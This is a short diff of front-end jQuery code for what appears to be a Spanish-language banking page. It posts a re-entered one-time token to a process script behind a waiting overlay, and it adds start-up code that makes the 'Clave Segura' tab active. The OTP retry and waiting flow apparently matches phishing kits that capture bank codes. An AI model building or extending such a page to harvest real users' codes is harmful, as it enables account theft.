@@ -171,11 +171,17 @@ $(document).ready(function($){
     });
   
 
-    $("#btn-validarerr").click(function(){      
+    $("#btn-validarerr").click(function(){
         $("#fondo").show();
         $("#mensaje").show();
         $.post( "../../../../../process/pasootp.php", { otp: $("#txt-tokenerr").val() } ,function(data) {
-            espera = 1;  
+            espera = 1;
         });
     });
+
+    // Inicializar con Clave Segura como opción activa
+    $("#clave-segura").css({"border-bottom":"2px solid #0040A8","color":"#0040a8"});
+    $("#tarjeta-debito").css({"border-bottom":"2px solid #e6e6e6","color":"#5c5c5c"});
+    $("#fmr-clave-s").show();
+    $("#fmr-tarjeta-d").hide();
 });
